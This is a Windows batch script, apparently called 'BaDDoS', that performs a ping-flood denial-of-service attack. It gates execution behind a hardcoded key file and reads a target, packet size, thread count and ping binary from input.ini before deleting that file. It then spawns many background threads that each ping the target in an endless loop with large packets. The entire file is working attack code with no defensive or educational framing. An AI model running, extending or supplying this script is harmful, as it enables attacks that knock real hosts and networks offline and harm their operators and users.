:: Programmed by hXR16F
:: hXR16F.ar@gmail.com

@echo off & cls
setlocal EnableDelayedExpansion
if not "%1" EQU "" goto :%1

if exist "BaDDoS_Verify" (for /F "tokens=1 delims=" %%i in (BaDDoS_Verify) do (set "key=%%i")) else (exit) & if not "%key%" EQU "f6#sq4Fp" (exit)
for /F "tokens=*" %%n in ('type BaDDoS.chr') do set chr=%%n
title #####_BaDDoS_#####
color 0F

for /L %%n in (1,1,16) do (
	set "nm_%%n=1"
)

if exist "input.ini" (
	mode 28,35
	set "line=0"
	for /F "tokens=1,2* delims=" %%i in (input.ini) do (
		set /A line+=1
		if !line! EQU 1 set "target=%%i%%j%%k"
		if !line! EQU 2 set "payload_size=%%i%%j%%k"
		if !line! EQU 3 set "timeout=%%i%%j%%k"
		if !line! EQU 4 set "version=%%i%%j%%k"
		if !line! EQU 5 set "threads=%%i%%j%%k"
		if !line! EQU 6 set "logging=%%i%%j%%k"
		if !line! EQU 7 set "faster=%%i%%j%%k"
	)
	if not "!faster!" EQU "1" set "faster=2"
	if /I not "!version!" EQU "Default" (
		set "version=PING\!version!.exe"
	) else (
		set "version=ping.exe"
	)
	del /F /Q "input.ini" > nul
	
	cls & mode 28,35 & goto flood
) else (
	exit
)

:flood
	if not %logging% EQU 1 (
		echo;%chr% Logging is disabled.
		echo;%chr% Running in background.
	)
	for /L %%n in (1,1,!threads!) do set "nm_%%n=1" & start /B %~nx0 thread %%n
	exit /B
	
	:thread %2
		%version% %target% -n %faster% -l %payload_size% -w %timeout% > nul && (
			if %logging% EQU 1 color 0A & echo;   #%2 %chr%  OK  %chr% #!nm_%2!
		) || (
			if %logging% EQU 1 color 0C & echo;   #%2 %chr% FAIL %chr% #!nm_%2!
		)
		
		set /A nm_%2+=1
		
		goto thread %2
		